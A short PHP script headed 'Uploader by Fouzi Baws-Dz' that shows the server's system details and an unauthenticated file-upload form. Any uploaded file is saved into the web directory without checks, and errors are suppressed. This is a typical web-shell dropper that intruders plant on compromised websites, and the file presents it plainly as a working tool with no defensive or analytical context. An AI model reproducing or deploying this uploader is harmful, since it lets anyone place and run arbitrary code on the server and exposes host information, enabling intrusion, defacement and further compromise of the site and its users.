<?php echo '<title>Uploader by Fouzi Baws-Dz</title>';
echo php_uname();
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if ($_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'Upload oK :D !!!';
    } else {
        echo 'Upload Ma7abch :3 !!!';
    }
}